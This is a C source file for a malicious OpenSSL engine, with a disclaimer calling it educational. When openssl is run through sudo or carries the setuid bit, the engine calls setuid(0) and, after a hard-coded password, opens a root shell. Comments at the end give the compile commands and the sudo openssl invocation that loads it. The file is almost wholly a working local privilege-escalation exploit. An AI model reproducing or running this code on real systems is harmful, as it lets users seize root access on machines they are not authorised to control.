#include <openssl/engine.h>
#include <stdio.h>
#include <string.h>

/*
Evil openSSL engine that drops a root shell when openssl can 
be executed with sudo or is saved with setuid.
Can be used for local privilege escalation (for educational purposes only)

By Frank Cozijnsen @deurstijl
*/

static int bind(ENGINE *e, const char *id)
{
    printf("Evil-Engine...\n");
    if (setuid(0) < 0)
    {
        perror("setuid");
        return 0;
    }
    char password[]="I know this is not safe\n"; // fgets also copies the newline
    char p[60];
	printf("Evil-engine-shell, enter password: ");
	fgets(p, sizeof p, stdin);

	if (strcmp(password,p)==0){
		system("sh");
	} else {
    	puts("Not Allowed!");
    }
    return 1;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()

// # Compile: 
// gcc -fPIC -o evil-engine.o -c evil-engine.c
// # Create shared object file:
// gcc -shared -o evil-engine.so -lcrypto evil-engine.o

// # Use with openssl
// sudo openssl req -engine $(pwd)/evil-engine.so 